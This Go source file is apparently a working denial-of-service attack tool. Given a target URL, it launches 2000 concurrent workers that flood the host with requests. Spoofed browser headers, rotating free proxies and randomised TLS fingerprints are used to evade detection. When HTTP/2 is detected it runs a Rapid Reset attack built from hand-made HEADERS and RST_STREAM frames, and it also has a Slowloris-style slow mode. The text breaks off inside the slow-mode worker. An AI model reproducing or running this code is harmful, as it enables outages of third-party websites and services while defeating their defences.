package main

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7604.56 Safari/537.36 Edg/146.0.7604.56",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
		"Twitterbot/1.0",
		"Mozilla/5.0 (Windows NT 12.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7642.78 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7681.89 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 16; Pixel 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7715.67 Mobile Safari/537.36",
	}

	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.linkedin.com/",
		"https://www.instagram.com/",
		"https://www.tiktok.com/",
		"https://discord.com/",
		"https://web.whatsapp.com/",
		"https://mail.google.com/",
		"https://drive.google.com/",
		"https://github.com/",
		"https://stackoverflow.com/",
		"https://www.amazon.com/",
		"https://x.com/",
		"https://www.threads.net/",
		"https://www.twitch.tv/",
		"",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9,en;q=0.8",
		"pt-BR,pt;q=0.9,en;q=0.8",
		"it-IT,it;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
		"ko-KR,ko;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"ru-RU,ru;q=0.9,en;q=0.8",
		"tr-TR,tr;q=0.9,en;q=0.8",
		"nl-NL,nl;q=0.9,en;q=0.8",
		"pl-PL,pl;q=0.9,en;q=0.8",
		"sv-SE,sv;q=0.9,en;q=0.8",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"*/*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"identity",
		"gzip;q=1.0, deflate;q=0.9, br;q=0.8",
		"*;q=0.1",
		"br, gzip, deflate",
	}

	cacheControls = []string{
		"no-cache",
		"no-store",
		"must-revalidate",
		"max-age=0",
		"private",
		"public",
		"no-transform",
		"proxy-revalidate",
		"s-maxage=0",
	}

	securityHeaders = []map[string]string{
		{"X-Content-Type-Options": "nosniff"},
		{"X-Frame-Options": "DENY"},
		{"X-Frame-Options": "SAMEORIGIN"},
		{"X-XSS-Protection": "1; mode=block"},
		{"Strict-Transport-Security": "max-age=31536000; includeSubDomains"},
		{"Referrer-Policy": "no-referrer"},
		{"Referrer-Policy": "strict-origin-when-cross-origin"},
		{"Referrer-Policy": "same-origin"},
		{"Cross-Origin-Opener-Policy": "same-origin"},
		{"Cross-Origin-Embedder-Policy": "require-corp"},
		{"Cross-Origin-Resource-Policy": "same-site"},
	}

	modernHeaders = []map[string]string{
		{"Sec-Fetch-Dest": "document"},
		{"Sec-Fetch-Dest": "empty"},
		{"Sec-Fetch-Dest": "script"},
		{"Sec-Fetch-Dest": "style"},
		{"Sec-Fetch-Dest": "image"},
		{"Sec-Fetch-Dest": "font"},
		{"Sec-Fetch-Dest": "worker"},
		{"Sec-Fetch-Mode": "navigate"},
		{"Sec-Fetch-Mode": "cors"},
		{"Sec-Fetch-Mode": "no-cors"},
		{"Sec-Fetch-Mode": "same-origin"},
		{"Sec-Fetch-Site": "same-origin"},
		{"Sec-Fetch-Site": "cross-site"},
		{"Sec-Fetch-Site": "none"},
		{"Sec-Fetch-User": "?1"},
		{"Upgrade-Insecure-Requests": "1"},
		{"DNT": "0"},
		{"DNT": "1"},
		{"Priority": "u=0, i"},
		{"Priority": "u=1, i"},
		{"Priority": "u=2, i"},
	}

	cloudflareHeaders = []map[string]string{
		{"CF-Connecting-IP": ""},
		{"CF-IPCountry": "US"},
		{"CF-IPCountry": "GB"},
		{"CF-IPCountry": "DE"},
		{"CF-IPCountry": "FR"},
		{"CF-IPCountry": "CA"},
		{"CF-IPCountry": "AU"},
		{"CF-IPCountry": "JP"},
		{"CF-IPCountry": "SG"},
		{"CF-IPCountry": "BR"},
		{"CF-IPCountry": "IN"},
		{"True-Client-IP": ""},
		{"CF-Ray": ""},
		{"CF-Visitor": `{"scheme":"https"}`},
	}

	hetznerHeaders = []map[string]string{
		{"X-Client-IP": ""},
		{"X-Cluster-Client-IP": ""},
		{"X-Hetzner-DataCenter": "FSN1-DC1"},
		{"X-Hetzner-DataCenter": "NBG1-DC3"},
		{"X-Hetzner-DataCenter": "HEL1-DC2"},
	}

	digitaloceanHeaders = []map[string]string{
		{"X-Forwarded-Host": ""},
		{"X-Forwarded-Port": "80"},
		{"X-Forwarded-Port": "443"},
		{"X-Forwarded-Port": "8080"},
		{"X-DO-Proxy": "true"},
	}

	awsHeaders = []map[string]string{
		{"X-Amz-Cf-Id": ""},
		{"X-Amz-Cf-Pop": "DFW"},
		{"X-Amz-Cf-Pop": "LHR"},
		{"X-Amz-Cf-Pop": "SIN"},
		{"X-Amz-Cf-Pop": "NRT"},
		{"X-Amz-Cf-Pop": "SYD"},
		{"Via": "1.1 amazon.cloudfront.net"},
		{"CloudFront-Forwarded-Proto": "https"},
		{"CloudFront-Is-Desktop-Viewer": "true"},
		{"CloudFront-Is-Mobile-Viewer": "false"},
	}

	cdnHeaders = []map[string]string{
		{"X-CDN": "Cloudflare"},
		{"X-CDN": "Akamai"},
		{"X-CDN": "Fastly"},
		{"X-CDN": "CloudFront"},
		{"X-CDN": "MaxCDN"},
		{"X-Edge-Location": "DFW"},
		{"X-Edge-Location": "LHR"},
		{"X-Edge-Location": "SIN"},
		{"X-Edge-Location": "NRT"},
		{"X-Edge-Location": "SYD"},
		{"X-Edge-Location": "GRU"},
		{"Via": "1.1 varnish"},
		{"X-Cache": "MISS"},
		{"X-Cache": "HIT"},
		{"X-Cache-Lookup": "MISS from cache"},
		{"X-Backend-Server": "web01"},
	}

	appHeaders = []map[string]string{
		{"X-Requested-With": "XMLHttpRequest"},
		{"X-Requested-With": "Fetch"},
		{"X-CSRF-Token": ""},
		{"Authorization": "Bearer "},
		{"X-API-Key": ""},
		{"X-Device-ID": ""},
		{"X-Session-ID": ""},
		{"X-Client-Version": "2.5.0"},
		{"X-App-Version": "4.2.1"},
		{"X-Platform": "web"},
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 5 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex
)

type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 141-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 135-138",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 18",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Edge 146-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
	targetHost string
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	return &tls.Config{
		NextProtos:                  sig.NextProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      randBool(),
		DynamicRecordSizingDisabled: randBool(),
	}
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
	}

	fmt.Printf("[+] Creating connection pool with %d connections (each with unique JA3 fingerprint)...\n", poolSize)

	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
		if (i+1)%100 == 0 {
			fmt.Printf("[+] Created %d/%d connections...\n", i+1, poolSize)
		}
	}

	fmt.Printf("[+] Connection pool ready! %d unique TLS fingerprints\n", poolSize)
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:               http.ProxyURL(proxyURL),
					TLSClientConfig:     getRandomizedTLSConfig(),
					MaxIdleConns:        100,
					MaxIdleConnsPerHost: 100,
					IdleConnTimeout:     120 * time.Second,
					DisableKeepAlives:   false,
					ForceAttemptHTTP2:   true,
				}
				http2.ConfigureTransport(transport)
				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
			}
		}
	}

	transport = &http.Transport{
		TLSClientConfig:     getRandomizedTLSConfig(),
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     120 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
	}
	http2.ConfigureTransport(transport)
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func detectProtocols(target string) []string {
	u, err := url.Parse(target)
	if err != nil {
		return []string{"h1"}
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	detected := make(map[string]bool)
	if u.Scheme == "https" {
		conn, err := tls.Dial("tcp", host+":"+port, &tls.Config{
			NextProtos:         []string{"h2", "http/1.1"},
			InsecureSkipVerify: true,
		})
		if err == nil {
			defer conn.Close()
			if conn.ConnectionState().NegotiatedProtocol == "h2" {
				detected["h2"] = true
			} else {
				detected["h1"] = true
			}
		}
	}
	if len(detected) == 0 {
		detected["h1"] = true
	}
	result := make([]string, 0, len(detected))
	for proto := range detected {
		result = append(result, proto)
	}
	return result
}

func rapidResetWorker(targetURL string, done chan struct{}, stats *atomicCounter) {
	u, _ := url.Parse(targetURL)
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	for {
		select {
		case <-done:
			return
		default:
			tlsConfig := getRandomizedTLSConfig()
			conn, err := tls.Dial("tcp", host+":"+port, tlsConfig)
			if err != nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}

			preface := []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
			if _, err := conn.Write(preface); err != nil {
				conn.Close()
				continue
			}
			conn.SetReadDeadline(time.Now().Add(3 * time.Second))
			buf := make([]byte, 24)
			if _, err := conn.Read(buf); err != nil {
				conn.Close()
				continue
			}
			conn.SetReadDeadline(time.Time{})

			settingsAck := []byte{0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00}
			conn.Write(settingsAck)

			basePath := "/" + randomString(randInt(5, 15))

			for i := 0; i < 200; i++ {
				select {
				case <-done:
					conn.Close()
					return
				default:
					streamID := uint32((i*2 + 1))
					headersFrame := buildValidHeadersFrame(streamID, host, basePath)
					if _, err := conn.Write(headersFrame); err != nil {
						break
					}
					rstFrame := buildRSTStreamFrame(streamID)
					if _, err := conn.Write(rstFrame); err != nil {
						break
					}
					stats.inc()
					time.Sleep(500 * time.Microsecond)
				}
			}
			conn.Close()
		}
	}
}

func buildValidHeadersFrame(streamID uint32, host, path string) []byte {
	scheme := byte(0x84)
	if strings.HasPrefix(host, "http://") {
		scheme = 0x83
	}
	hpackData := []byte{0x82, scheme, 0x86}
	pathBytes := []byte(path)
	hpackData = append(hpackData, byte(len(pathBytes)))
	hpackData = append(hpackData, pathBytes...)
	hpackData = append(hpackData, 0x87)
	hostBytes := []byte(host)
	hpackData = append(hpackData, byte(len(hostBytes)))
	hpackData = append(hpackData, hostBytes...)
	flags := byte(0x04)
	frame := make([]byte, 9+len(hpackData))
	frame[0] = byte(len(hpackData) >> 16)
	frame[1] = byte(len(hpackData) >> 8)
	frame[2] = byte(len(hpackData))
	frame[3] = 0x01
	frame[4] = flags
	frame[5] = byte(streamID >> 24)
	frame[6] = byte(streamID >> 16)
	frame[7] = byte(streamID >> 8)
	frame[8] = byte(streamID)
	copy(frame[9:], hpackData)
	return frame
}

func buildRSTStreamFrame(streamID uint32) []byte {
	frame := make([]byte, 13)
	frame[0] = 0x00
	frame[1] = 0x00
	frame[2] = 0x04
	frame[3] = 0x03
	frame[4] = 0x00
	frame[5] = byte(streamID >> 24)
	frame[6] = byte(streamID >> 16)
	frame[7] = byte(streamID >> 8)
	frame[8] = byte(streamID)
	frame[9] = 0x00
	frame[10] = 0x00
	frame[11] = 0x00
	frame[12] = 0x08
	return frame
}

func loadProxiesFromAPI() {
	resp, err := http.Get(proxyAPI)
	if err != nil {
		fmt.Printf("[-] Error fetching proxies: %v\n", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		fmt.Printf("[-] ProxyScrape returned %d\n", resp.StatusCode)
		return
	}

	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")
	newProxies := []string{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}
	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
	fmt.Printf("[+] Loaded/Refreshed %d proxies from ProxyScrape\n", len(proxies))
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println(" ::::'######::::'#######::::: ")
	fmt.Println(" :::'##... ##::'##.... ##:::: ")
	fmt.Println(" ::: ##:::..::: ##:::: ##:::: ")
	fmt.Println(" ::: ##::'####: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" :::. ######:::. #######::::: ")
	fmt.Println(" ::::......:::::.......:::::: ")
	fmt.Println("\033[0m")
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCloudflareIP() string {
	firstOctet := []int{173, 103, 141, 108, 104, 172}[randInt(0, 5)]
	secondOctet := randInt(0, 255)
	return fmt.Sprintf("%d.%d.%d.%d", firstOctet, secondOctet, randInt(0, 255), randInt(1, 254))
}

func generateCacheBustParams() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
		"?cachebuster=" + randomString(8),
		"?" + randomString(4) + "=" + randomString(6) + "&" + randomString(5) + "=" + randomString(8),
		"?utm_source=" + randomString(6) + "&utm_medium=" + randomString(5) + "&utm_campaign=" + randomString(8),
		"?sessionid=" + randomString(32),
		"?PHPSESSID=" + randomString(26),
		"?jsessionid=" + randomString(24),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generateAdvancedPath() string {
	if randInt(1, 100) <= 30 {
		depth := randInt(2, 6)
		path := ""
		for i := 0; i < depth; i++ {
			path += randomString(randInt(4, 12)) + "/"
		}
		if randBool() {
			extensions := []string{".php", ".html", ".jsp", ".asp", ".aspx", ".json", ".xml"}
			path = strings.TrimSuffix(path, "/") + extensions[randInt(0, len(extensions)-1)]
		}
		return "/" + path
	}
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
		"/static/css/main.css", "/static/js/app.js", "/static/images/logo.png",
		"/.env", "/config.json", "/api.json", "/manifest.json",
		"/graphql", "/rest/v1", "/health", "/status", "/metrics",
	}
	return paths[randInt(0, len(paths)-1)]
}

func generateStudentNumber() string {
	formats := []func() string{
		func() string { return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999)) },
		func() string { return fmt.Sprintf("%d%06d", randInt(2015, 2025), randInt(1, 999999)) },
		func() string { return fmt.Sprintf("S-%07d", randInt(1, 9999999)) },
		func() string { return fmt.Sprintf("%010d", randInt(1000000000, 9999999999)) },
	}
	return formats[randInt(0, len(formats)-1)]()
}

func generateCookies() string {
	cookies := []string{}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomString(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
	}
	if randBool() {
		langs := []string{"en", "fr", "de", "es", "pt", "it", "ja", "ko", "zh", "ru"}
		cookies = append(cookies, fmt.Sprintf("lang=%s", langs[randInt(0, len(langs)-1)]))
	}
	if len(cookies) == 0 {
		return ""
	}
	return strings.Join(cookies, "; ")
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
	useProxy := len(os.Args) >= 5

	if useProxy {
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			fmt.Println("[-] No Proxy Detected, Running Without Proxy")
			useProxy = false
		}
	}

	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: go run main.go <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
		os.Exit(1)
	}

	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])

	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
		os.Exit(1)
	}

	u, err := url.Parse(target)
	if err != nil || u.Scheme == "" || u.Host == "" {
		if strings.Contains(target, ":") && !strings.Contains(target, "://") {
			target = "http://" + target
		} else if !strings.HasPrefix(target, "http") {
			target = "https://" + target
		}
		u, err = url.Parse(target)
		if err != nil {
			fmt.Println("Invalid target URL:", err)
			os.Exit(1)
		}
	}

	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second

	fmt.Printf("[+] Auto-detecting supported protocols for %s...\n", target)
	protocols := detectProtocols(target)
	fmt.Printf("[+] Detected protocols: %s\n", strings.Join(protocols, ", "))

	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2000\n")
	fmt.Printf("[+] Detected Protocols: %s\n", strings.Join(protocols, ", "))
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d (rotating + refresh every %.0f min)\n", len(proxies), refreshInterval.Minutes())
	}
	fmt.Println("[+] Starting... Ctrl+C to stop")

	poolSize := 500
	connectionPool := NewConnectionPool(poolSize, useProxy, u.Host)
	fmt.Printf("[+] JA3 Randomization: ON (%d unique TLS fingerprints in pool)\n", poolSize)

	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()

	go func() {
		time.Sleep(duration)
		close(done)
	}()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()

	h2Supported := false
	for _, p := range protocols {
		if p == "h2" {
			h2Supported = true
			break
		}
	}

	const workers = 2000

	if h2Supported && mode == "GET" {
		rapidWorkers := workers / 4
		normalWorkers := workers - rapidWorkers
		fmt.Printf("[+] HTTP/2 detected! Using %d workers for Rapid Reset attack\n", rapidWorkers)
		for i := 0; i < rapidWorkers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				rapidResetWorker(target, done, stats)
			}(i)
		}
		for i := 0; i < normalWorkers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				attackWorker(target, u.Host, mode, done, stats, useProxy, connectionPool)
			}(i)
		}
	} else {
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				attackWorker(target, u.Host, mode, done, stats, useProxy, connectionPool)
			}(i)
		}
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				fmt.Printf("\n[+] Attack completed!\n")
				fmt.Printf("Target: %s\n", target)
				fmt.Printf("Mode: %s\n", mode)
				fmt.Printf("Duration: %d sec\n", durationSec)
				fmt.Printf("Total requests/streams: %d\n", stats.get())
				fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/duration.Seconds())
				return
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				rps := float64(stats.get()) / elapsed
				fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
			}
		}
	}()

	wg.Wait()
	connectionPool.CloseIdleConnections()
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			path := generateAdvancedPath()
			if mode != "SLOW" && randInt(1, 100) <= 70 {
				if strings.Contains(path, "?") {
					path += "&" + generateCacheBustParams()[1:]
				} else {
					path += generateCacheBustParams()
				}
			}
			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}

			var req *http.Request
			var err error

			if mode == "SLOW" {
				conn, err := net.DialTimeout("tcp", host, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				defer conn.Close()
				conn.SetDeadline(time.Now().Add(300 * time.Second))
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, randomUA())
				go func(c net.Conn, doneChan chan struct{}) {
					ticker := time.NewTicker(time.Duration(randInt(4, 12)) * time.Second)
					defer ticker.Stop()
					for {
						select {
						case <-doneChan:
							return
						case <-ticker.C:
							fmt.Fprintf(c, "X-%s: %s\r\n", randomString(4), randomString(8))
							c.SetDeadline(time.Now().Add(300 * time.Second))
						}
					}
				}(conn, done)
